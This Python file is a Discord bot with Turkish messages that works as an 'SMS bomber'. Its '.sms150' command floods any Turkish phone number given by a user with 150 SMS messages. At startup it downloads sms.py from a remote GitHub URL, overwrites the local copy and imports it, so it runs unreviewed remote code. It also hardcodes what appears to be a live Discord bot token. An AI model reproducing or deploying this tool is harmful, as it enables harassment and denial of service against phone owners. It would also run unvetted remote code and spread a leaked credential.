import discord
from time import sleep
from requests import get
r = get("https://raw.githubusercontent.com/hha1337/Project11/main/sms.py").text
with open("sms.py", "r", encoding="utf-8") as f:
    read = f.read()
if read == r:
    pass
else:
    print("Güncelleme yapılıyor...")
    with open("sms.py", "w", encoding="utf-8") as f:
        f.write(r)
from sms import SendSms

TOKEN = "MTA2NDkwNTg1MDQzNjcyMjcyOA.G_puHI.RnpDVySVqU4nYQ_j4Q2Ar4a8TiQi-ny5N7-IfU"
gif = "https://media.tenor.com/SWiGXYOM8eMAAAAC/russia-soviet.gif"
adet = 150
saniye = 0

intents = discord.Intents.all()
client = discord.Client(intents=intents)

@client.event
async def on_ready():
    print('{} Çalışmaya Başladı!'.format(client.user))
    activity = discord.Activity(type=discord.ActivityType.playing, name=".yardım")
    await client.change_presence(activity=activity)
    
@client.event
async def on_message(message):
    if message.author == client.user:
        return

    if len(message.content.split(" ")) == 2 and message.content.split(" ")[0] == ".sms150":
        if len(message.content.split(" ")[1]) == 10:
            telno = message.content.split(" ")[1]
            embed=discord.Embed(title="Ahlak SMS Bomber +90 (150)", description=(f"```Belirtilen numaraya {adet} adet SMS Bomb işlemi başlatıldı. Numara; {telno}```\n{message.author.mention}"), color=0x5f5221)
            embed.set_thumbnail(url=gif)
            await message.channel.send(embed=embed)
            sms = SendSms(telno, "")
            while sms.adet < adet:
                for attribute in dir(SendSms):
                    attribute_value = getattr(SendSms, attribute)
                    if callable(attribute_value):
                        if attribute.startswith('__') == False:
                            if sms.adet == adet:
                                break
                            exec("sms."+attribute+"()")
                            sleep(saniye)
            await message.channel.send(telno+" = Bu numaraya "+str(sms.adet)+f" adet SMS gönderildi,işlem başarıyla tamamlandı!.\n{message.author.mention}")                        
        else:
            await message.channel.send(f"Görünüşe göre böyle bir komut bulunmuyor!\n Komutlar hakkında bilgi almak için ' .yardım ' komutunu kullanabilirsiniz.\n{message.author.mention}")
    
    
client.run(TOKEN)
